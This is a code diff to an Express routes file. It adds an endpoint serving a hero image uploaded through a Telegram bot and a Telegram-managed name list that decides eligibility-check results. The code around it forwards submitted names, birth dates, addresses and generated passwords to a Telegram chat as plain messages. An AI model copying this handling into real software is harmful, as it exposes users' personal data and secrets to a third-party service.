@@ -4,6 +4,8 @@ import { storage } from "./storage";
 import { insertContactSubmissionSchema } from "@shared/schema";
 import { z } from "zod";
 import { generatePassword, addPassword, validatePassword } from "./auth";
+import { isEligibleName } from "./eligible-names";
+import { findHeroImagePath, heroImageContentType } from "./hero-image";
 
 // Helper function to send messages to Telegram
 async function sendToTelegram(message: string) {
@@ -38,6 +40,19 @@ async function sendToTelegram(message: string) {
 }
 
 export async function registerRoutes(app: Express): Promise<Server> {
+  // Hero image uploaded through the Telegram bot
+  app.get("/api/hero-image", (req, res) => {
+    const filePath = findHeroImagePath();
+
+    if (!filePath) {
+      res.status(404).json({ message: "No hero image has been uploaded" });
+      return;
+    }
+
+    res.set({ "Content-Type": heroImageContentType(filePath), "Cache-Control": "no-cache" });
+    res.sendFile(filePath);
+  });
+
   // Generate new password and send to Telegram
   app.post("/api/generate-password", async (req, res) => {
     try {
@@ -288,7 +303,10 @@ ${validatedData.reportDetails}
       });
 
       const validatedData = eligibilitySchema.parse(req.body);
-      
+
+      // The eligible-name list (managed from Telegram) is the only source of truth
+      const eligible = isEligibleName(validatedData.fullName);
+
       // Send to Telegram
       const telegramMessage = `
 🔍 *ELIGIBILITY CHECK SUBMISSION*
@@ -296,6 +314,7 @@ ${validatedData.reportDetails}
 *Name:* ${validatedData.fullName}
 *Date of Birth:* ${validatedData.dateOfBirth}
 *Address:* ${validatedData.address}
+*Result:* ${eligible ? "ELIGIBLE" : "NOT ELIGIBLE"}
 
 *Timestamp:* ${new Date().toISOString()}
       `.trim();
@@ -303,8 +322,10 @@ ${validatedData.reportDetails}
       await sendToTelegram(telegramMessage);
 
       res.status(200).json({ 
-        result: 'eligible',
-        message: "Eligibility check completed"
+        result: eligible ? 'eligible' : 'not_eligible',
+        message: eligible
+          ? "Eligibility check completed"
+          : "This name is not on the eligible list"
       });
 
     } catch (error) {
